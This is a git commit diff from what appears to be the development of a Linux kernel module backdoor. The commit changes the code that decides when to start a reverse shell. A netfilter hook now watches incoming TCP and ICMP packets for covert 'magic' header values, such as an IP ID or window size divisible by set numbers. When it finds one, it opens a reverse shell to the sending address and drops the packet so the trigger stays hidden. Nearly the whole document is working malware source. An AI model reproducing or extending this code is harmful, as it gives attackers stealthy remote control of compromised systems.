2a49fa33d4b004eeb3d7a39ce3d72e99a400d3dc
GefenHajaj <gefenhajaj@gmail.com>
2020-04-28 05:42:08 -0700

    Added magic packet parse

--- main.c
+++ main.c
@@ -34,7 +34,13 @@
 // Move later to "conf.h" file!
 #define DEBUG 1
 
-#define MAGIC_VALUE "hello"
+// #define MAGIC_VALUE "hello"
+#define IPID_DIVIDE 17
+#define ICMP_ID_DIVIDE 3
+#define ICMP_SEQ_DIVIDE 7
+#define TCP_SPORT 3479
+#define TCP_DPORT 443
+#define TCP_WINDOW_DIVIDE 113
 /////////////////////
 
 // Change later:
@@ -134,16 +140,21 @@ void magic_command(char *IP) {
 // Search for ICMP Echo packets with the data "hello". 
 // If found, create reverse shell to localhost.
 // not tested.
-unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+unsigned int backdoor_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	struct iphdr *ip_header;
-	//const struct icmphdr *icmp_header;
+	struct icmphdr *icmp_header;
+	struct tcphdr *tcp_header;
+
 	struct iphdr _iph;
 	struct icmphdr _icmph;
-	const char *data = NULL;
-	char *_data;
-	int size, str_size;
+	struct tcphdr _tcph;
+
 	char sourceIP[16];
+
+	// If reverse shell already working... Just exit
+	if (reverse_shell_working)
+		return NF_ACCEPT;
 
 	if (!skb)
 		return NF_ACCEPT;
@@ -153,11 +164,62 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 	if (!ip_header || !ip_header->protocol)
 		return NF_ACCEPT;
 
-	if (ip_header->protocol == IPPROTO_ICMP && !reverse_shell_working) {
-		snprintf(sourceIP, 16, "%pI4", &ip_header->saddr); // Mind the &!
-		debugPrint("Got ICMP packet! (address one line down)");
-		debugPrint(sourceIP);
+	// Make sure ip id divides by magic value
+	if (htons(ip_header->id) % IPID_DIVIDE != 0)
+		return NF_ACCEPT;
 
+	// Get the source IP
+	snprintf(sourceIP, 16, "%pI4", &ip_header->saddr); // Mind the &!
+
+	// If packet is TCP
+	if (ip_header->protocol == IPPROTO_TCP) {
+		tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcph), &_tcph);
+
+		if (!tcp_header)
+			return NF_ACCEPT;
+
+		// Make sure dest and source ports match to our configuration
+		if (htons(tcp_header->source) != TCP_SPORT || htons(tcp_header->dest) != TCP_DPORT)
+			return NF_ACCEPT;
+
+		// Make sure tcp window divides by magic
+		if (htons(tcp_header->window) % TCP_WINDOW_DIVIDE != 0)
+			return NF_ACCEPT;
+
+		// If we got here - reverse shell!
+		debugPrint("Got TCP packet that mathces reqiuerments.");
+		magic_command(sourceIP); // Start reverse shell
+		return NF_DROP;
+	}
+
+	// If ICMP packet
+	if (ip_header->protocol == IPPROTO_ICMP) {
+		icmp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
+
+		if (!icmp_header)
+			return NF_ACCEPT;
+
+		// Make sure its echo request
+		if (icmp_header->type != ICMP_ECHO) {
+			return NF_ACCEPT;
+		}
+
+		// Make sure seq number divides by magic
+		if (htons(icmp_header->un.echo.sequence) % ICMP_SEQ_DIVIDE != 0) {
+			return NF_ACCEPT;
+		}
+
+		// Make sure icmp id number divides by magic
+		if  (htons(icmp_header->un.echo.id) % ICMP_ID_DIVIDE != 0) {
+			return NF_ACCEPT;
+		}
+
+		// If we got here - reverse shell!
+		debugPrint("Got ICMP packet that mathces reqiuerments.");
+		magic_command(sourceIP); // Start reverse shell
+		return NF_DROP;
+
+		/*
 		// Calculate where the data of the packet is...
 		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
 		_data = kmalloc(size, GFP_KERNEL);
@@ -183,98 +245,23 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 		
 		debugPrint("Packet data is not magic.");
 		return NF_ACCEPT;
+		*/
 	}
 
+	// Not ICMP or TCP packet - Accept it
 	return NF_ACCEPT;
-
-	/*
-	const struct iphdr *ip_header;
-	const struct icmphdr *icmp_header;
-	struct iphdr _iph;
-	struct icmphdr _icmph;
-	const char *data = NULL;
-	char *_data;
-	int size, str_size;
-
-	if (!skb)
-		return NF_ACCEPT;
-
-	ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
-
-	// Make sure everything works
-	if (!ip_header)
-		return NF_ACCEPT;
-	if (!ip_header->protocol)
-		return NF_ACCEPT;
-
-	// Check for IPID (maybe later!)
-	// if (htons(ip_header->id) != IPID)
-	// 	return ACCEPT;
-
-	// Make sure we're ICMP
-	if (ip_header->protocol == IPPROTO_ICMP) {
-		icmp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
-
-		if (!icmp_header)
-			return NF_ACCEPT;
-
-		// Make sure it's ping
-		if (icmp_header->code != ICMP_ECHO)
-			return NF_ACCEPT;
-
-		debugPrint("Got echo request! Checking for magic value.");
-		// Check seq and win numbers! maybe later.
-		// if (htons(icmp_header->un.echo.sequence) == SEQ &&
-		//     htons(icmp_header->un.echo.id) == WIN) {
-
-		// Calculate where the data of the packet is...
-		size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
-		_data = kmalloc(size, GFP_KERNEL);
-
-		if (!_data)
-			return NF_ACCEPT;
-
-		str_size = size - strlen(MAGIC_VALUE);
-
-		data = skb_header_pointer(skb, ip_header->ihl * 4 + sizeof(struct icmphdr), size, &_data);
-
-		if (!data) {
-			kfree(_data);
-			return NF_ACCEPT;
-		}
-
-		// Check if data of packet is our magic value (hello)
-		if (memcmp(data, MAGIC_VALUE, strlen(MAGIC_VALUE)) == 0) {
-
-			debugPrint("Got ICMP Packet with magic value!");
-
-			if (!reverse_shell_working)
-				start_reverse_shell("127.0.0.1", "1234");
-
-			kfree(_data);
-
-			// Drop the packet - we don't need to answer that
-			return NF_DROP;
-		}
-
-		kfree(_data);
-	}
-	// }
-
-	return NF_ACCEPT;
-	*/
 }
 
 // Register our packets filter
 // not tested.
-static int register_icmp_listener(void)
+static int register_backdoor_hook(void)
 {
 	int ret;
 
-	debugPrint("Registerig icmp_listener");
+	debugPrint("Registerig backdoor_hook");
 	netf_hook = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 	/* set flags and function for netfilter */
-	netf_hook->hook = (nf_hookfn*)icmp_listener;
+	netf_hook->hook = (nf_hookfn*)backdoor_hook;
 	netf_hook->hooknum = NF_INET_LOCAL_IN;
 	netf_hook->pf = PF_INET;
 	netf_hook->priority = NF_IP_PRI_FIRST;
@@ -298,7 +285,7 @@ static int register_icmp_listener(void)
 
 // Unregister our netfilter!!!
 // Not tested.
-void unregister_icmp_listener(void) {
+void unregister_backdoor_hook(void) {
 	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
     	nf_unregister_net_hook(&init_net, netf_hook);
 	#else
@@ -310,13 +297,13 @@ void unregister_icmp_listener(void) {
 static int __init start_module(void) {
 	debugPrint(KERN_INFO "Started backdoor.");
 
-	register_icmp_listener();
+	register_backdoor_hook();
 	return 0;
 }
 
 // Remove module
 static void __exit stop_module(void) {
-	unregister_icmp_listener();
+	unregister_backdoor_hook();
 	debugPrint(KERN_INFO "Stopped backdoor.");
 }
 
